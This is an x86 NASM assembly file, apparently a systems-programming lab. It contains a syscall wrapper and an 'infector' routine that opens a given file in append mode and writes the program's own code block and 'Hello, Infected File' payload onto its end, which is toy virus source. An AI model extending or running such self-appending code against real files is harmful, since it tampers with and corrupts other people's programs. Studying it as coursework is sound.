section .data
;msg: db "Hello, Infected File",10,0 ;this is our message
section .bss
fileDescriptor: resw 1

section .text
global _start
global system_call
extern main
global code_start
global code_end
global infection
global infector


_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )


    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop
        
system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

code_start:
    ;push    ebp             ; Save caller state
    ;mov     ebp, esp

msg: db "Hello, Infected File",10,0 ;this is our message

infection:                  ; print the message "Hello infected file"
    push    ebp             ; Save caller state
    mov     ebp, esp
    pushad 

    push 21
    push msg
    push 1
    push 4
    call system_call
    add esp,16
    jmp code_end

infector:
    ;parameter: fileName to edit
    ;open the file, and write to it's end, a msg
    ;msg = code_start to code_end

    push    ebp             ; Save caller state
    mov     ebp, esp
    pushad

    mov ecx,0
    mov edx,0
    
    ;file open system_call
    push 0777
    mov ecx,0
    mov dl, 0x0008         ;append
    mov cl, 0x0001         ;write
    or cl, dl             ;or bitwise: write & append - 0x0001 | 0x0008
    push ecx
    mov ebx,0
    mov ebx,[ebp+8] 
    push ebx
    push 5 
    call system_call
    add esp,16

    mov [fileDescriptor], eax  ;save file descriptor

    ;seek end
    push 2
    push 0
    mov ebx,0
    mov ebx,[fileDescriptor]
    push ebx
    push 19 
    call system_call
    add esp,16

    ;write to file
    mov edx,0
    mov edx, code_end-code_start
    push edx
    mov ecx,0
    mov ecx, code_start
    push ecx
    mov ebx,0
    mov ebx,[fileDescriptor]
    push ebx
    push 4
    call system_call
    add esp,16

    ;close file
    mov ebx,0
    mov ebx,[fileDescriptor]
    push ebx
    push 6
    call system_call
    add esp,8

code_end:
    popad                   ; Restore caller state (registers)
    mov esp, ebp    ; Function exit code
    pop ebp
    ret